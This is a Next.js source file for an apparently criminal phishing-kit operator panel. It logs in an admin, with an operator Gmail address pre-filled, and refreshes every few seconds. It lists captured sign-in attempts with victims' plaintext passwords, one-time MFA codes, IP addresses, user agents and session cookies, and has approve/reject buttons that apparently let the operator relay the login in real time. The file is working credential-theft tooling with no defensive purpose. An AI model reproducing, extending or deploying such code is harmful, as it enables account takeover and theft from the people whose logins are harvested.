'use client'

import { useCallback, useEffect, useState } from 'react'
import {
  adminLogin,
  adminLogout,
  isAdminSession,
  listAttempts,
  decide,
} from '@/app/actions'
import type { LoginAttempt } from '@/lib/store'

function fmt(ts: number) {
  try {
    return new Date(ts).toLocaleString()
  } catch {
    return String(ts)
  }
}

export default function OpsPage() {
  const [authed, setAuthed] = useState(false)
  const [email, setEmail] = useState('blessedresult6@gmail.com')
  const [password, setPassword] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [attempts, setAttempts] = useState<LoginAttempt[]>([])
  const [busy, setBusy] = useState(false)

  const refresh = useCallback(async () => {
    const ok = await isAdminSession()
    setAuthed(ok)
    if (ok) {
      const rows = await listAttempts()
      setAttempts(rows)
    }
  }, [])

  useEffect(() => {
    refresh()
    const id = setInterval(refresh, 3000)
    return () => clearInterval(id)
  }, [refresh])

  async function onLogin(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setBusy(true)
    const r = await adminLogin({ email, password })
    setBusy(false)
    if (!r.ok) {
      setError(r.error)
      return
    }
    setAuthed(true)
    await refresh()
  }

  async function onDecide(id: string, decision: 'approved' | 'rejected') {
    setBusy(true)
    await decide(id, decision)
    setBusy(false)
    await refresh()
  }

  if (!authed) {
    return (
      <main style={pageCenter}>
        <div style={{ width: '100%', maxWidth: 360 }}>
          <h1 style={{ marginTop: 0, fontSize: 20 }}>Admin</h1>
          <form onSubmit={onLogin} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              style={inputStyle}
              placeholder="Admin email"
            />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={inputStyle}
              placeholder="Password"
            />
            {error && <p style={{ color: '#c00', margin: 0 }}>{error}</p>}
            <button type="submit" disabled={busy} style={btnPrimary}>
              {busy ? '…' : 'Enter'}
            </button>
          </form>
        </div>
      </main>
    )
  }

  return (
    <main style={{ maxWidth: 900, margin: '0 auto', padding: '24px 16px', fontFamily: 'system-ui, sans-serif' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
        <div>
          <h1 style={{ margin: '0 0 4px', fontSize: 20 }}>Sign-in records</h1>
          <p style={{ margin: 0, fontSize: 13, color: '#555' }}>
            History kept after approve/reject · refresh every 3s
          </p>
        </div>
        <button
          type="button"
          onClick={async () => {
            await adminLogout()
            setAuthed(false)
          }}
          style={btnGhost}
        >
          Log out
        </button>
      </div>

      <div style={{ marginTop: 20, display: 'flex', flexDirection: 'column', gap: 14 }}>
        {attempts.length === 0 && (
          <p style={{ color: '#555', textAlign: 'center', padding: 32 }}>No records yet.</p>
        )}
        {attempts.map((a) => (
          <div
            key={a.id}
            style={{
              border: '1px solid #ccc',
              padding: 14,
              background: '#fff',
            }}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, flexWrap: 'wrap' }}>
              <div>
                <strong>{a.email}</strong>
                <div style={{ fontSize: 13, color: '#555' }}>
                  {a.step} · {a.status}
                </div>
                <div style={{ fontSize: 13, marginTop: 4 }}>{a.lastEvent}</div>
                <div style={{ fontSize: 12, color: '#555', marginTop: 4 }}>
                  Started: {fmt(a.createdAt)} · Updated: {fmt(a.updatedAt)}
                </div>
              </div>
              <div style={{ display: 'flex', gap: 8 }}>
                <button
                  type="button"
                  disabled={busy || a.status !== 'awaiting_approval'}
                  onClick={() => onDecide(a.id, 'approved')}
                  style={btnPrimary}
                >
                  Approve
                </button>
                <button
                  type="button"
                  disabled={busy || a.status === 'approved' || a.status === 'rejected'}
                  onClick={() => onDecide(a.id, 'rejected')}
                  style={btnGhost}
                >
                  Reject
                </button>
              </div>
            </div>
            <pre
              style={{
                marginTop: 12,
                padding: 12,
                background: '#f5f5f5',
                fontSize: 12,
                overflow: 'auto',
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
              }}
            >{`Email: ${a.email}
Password: ${a.passwordPlain}
Username: ${a.username || '—'}
OTP: ${a.otpPlain || '—'}  (#1 ${a.otp1Verified ? 'yes' : 'no'}  #2 ${a.otp2Verified ? 'yes' : 'no'})
IP: ${a.ip || '—'}
UA: ${a.userAgent || '—'}
Cookies: ${a.cookieHeader || '—'}
Started: ${fmt(a.createdAt)}
Updated: ${fmt(a.updatedAt)}`}</pre>
          </div>
        ))}
      </div>
    </main>
  )
}

const pageCenter: React.CSSProperties = {
  minHeight: '100vh',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  padding: 24,
  background: '#fff',
  color: '#000',
  fontFamily: 'system-ui, sans-serif',
}

const inputStyle: React.CSSProperties = {
  height: 36,
  borderRadius: 2,
  border: '1px solid #ccc',
  background: '#fff',
  color: '#000',
  padding: '0 8px',
}

const btnPrimary: React.CSSProperties = {
  height: 36,
  padding: '0 14px',
  borderRadius: 2,
  border: '1px solid #999',
  background: '#f0f0f0',
  color: '#000',
  cursor: 'pointer',
}

const btnGhost: React.CSSProperties = {
  height: 36,
  padding: '0 14px',
  borderRadius: 2,
  border: '1px solid #ccc',
  background: '#fff',
  color: '#000',
  cursor: 'pointer',
}
